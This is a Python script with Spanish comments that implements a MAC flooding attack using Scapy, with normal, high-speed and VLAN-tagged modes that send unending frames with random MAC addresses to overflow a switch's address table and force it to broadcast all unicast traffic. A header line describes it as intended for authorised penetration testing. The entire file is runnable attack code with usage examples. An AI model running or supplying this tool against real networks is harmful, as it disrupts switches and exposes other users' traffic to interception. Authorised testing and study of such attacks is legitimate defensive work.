#!/usr/bin/env python3
"""
MAC Flooding Attack - Llena la tabla CAM del switch
Para pruebas de penetración autorizadas
"""

from scapy.all import *
import random
import sys
import time

def random_mac():
    """Genera una MAC aleatoria"""
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff)
    )

def mac_flood(interface, count=0, delay=0.001):
    """
    Inunda el switch con paquetes de MAC aleatorias
    
    Args:
        interface: Interfaz de red a usar
        count: Cantidad de paquetes (0 = infinito)
        delay: Delay entre paquetes en segundos
    """
    print(f"[*] Iniciando MAC Flooding en {interface}")
    print(f"[*] Presiona Ctrl+C para detener")
    print(f"[*] Enviando paquetes...\n")
    
    pkt_count = 0
    
    try:
        while True:
            # Generar MACs aleatorias
            src_mac = random_mac()
            dst_mac = random_mac()
            
            # Crear paquete Ethernet con payload mínimo
            # Usamos un paquete que requiera registro en tabla CAM
            packet = Ether(src=src_mac, dst=dst_mac) / \
                     IP(src="10.0.0.1", dst="10.0.0.2") / \
                     ICMP()
            
            # Enviar paquete
            sendp(packet, iface=interface, verbose=0)
            
            pkt_count += 1
            
            # Mostrar progreso cada 100 paquetes
            if pkt_count % 100 == 0:
                print(f"[+] Paquetes enviados: {pkt_count} | MACs únicas: {pkt_count}")
            
            # Delay opcional
            if delay > 0:
                time.sleep(delay)
            
            # Si se especificó count, verificar límite
            if count > 0 and pkt_count >= count:
                break
                
    except KeyboardInterrupt:
        print(f"\n[*] Detenido. Total paquetes enviados: {pkt_count}")
        print("[*] El switch debería estar en modo 'fail-open' ahora")
        print("[*] Todo el tráfico unicast se está inundando a todos los puertos")

def fast_flood(interface):
    """Versión ultra-rápida usando sendpfast"""
    print(f"[*] MAC Flooding rápido en {interface}")
    
    # Generar lista de paquetes
    packets = []
    for _ in range(10000):
        pkt = Ether(src=random_mac(), dst=random_mac()) / \
              IP(src="1.2.3.4", dst="5.6.7.8") / \
              UDP(sport=1234, dport=5678)
        packets.append(pkt)
    
    print(f"[*] Enviando {len(packets)} paquetes...")
    
    try:
        while True:
            sendp(packets, iface=interface, verbose=0)
            print("[+] Lote de 10k paquetes enviado")
    except KeyboardInterrupt:
        print("\n[*] Detenido")

def targeted_flood(interface, target_vlan=None):
    """
    MAC Flooding con VLAN tagging (para switches con VLANs)
    """
    print(f"[*] MAC Flooding con VLAN support en {interface}")
    
    if target_vlan:
        vlans = [target_vlan]
    else:
        vlans = range(1, 4095)  # Todas las VLANs posibles
    
    pkt_count = 0
    
    try:
        while True:
            for vlan in vlans:
                src_mac = random_mac()
                dst_mac = random_mac()
                
                # Paquete con VLAN tag (802.1Q)
                packet = Ether(src=src_mac, dst=dst_mac) / \
                         Dot1Q(vlan=vlan) / \
                         IP(src="10.0.0.1", dst="10.0.0.2") / \
                         ICMP()
                
                sendp(packet, iface=interface, verbose=0)
                pkt_count += 1
                
                if pkt_count % 500 == 0:
                    print(f"[+] VLAN {vlan} | Total: {pkt_count}")
                    
    except KeyboardInterrupt:
        print(f"\n[*] Detenido. Total: {pkt_count}")

def main():
    if len(sys.argv) < 2:
        print(f"Uso: {sys.argv[0]} <interfaz> [modo] [opciones]")
        print(f"\nModos:")
        print(f"  normal   - Flooding estándar (default)")
        print(f"  fast     - Flooding ultra-rápido")
        print(f"  vlan     - Flooding con VLAN hopping")
        print(f"\nEjemplos:")
        print(f"  sudo {sys.argv[0]} eth0")
        print(f"  sudo {sys.argv[0]} eth0 fast")
        print(f"  sudo {sys.argv[0]} eth0 vlan")
        sys.exit(1)
    
    interface = sys.argv[1]
    modo = sys.argv[2] if len(sys.argv) > 2 else "normal"
    
    if modo == "fast":
        fast_flood(interface)
    elif modo == "vlan":
        vlan_id = int(sys.argv[3]) if len(sys.argv) > 3 else None
        targeted_flood(interface, vlan_id)
    else:
        mac_flood(interface)

if __name__ == "__main__":
    main()
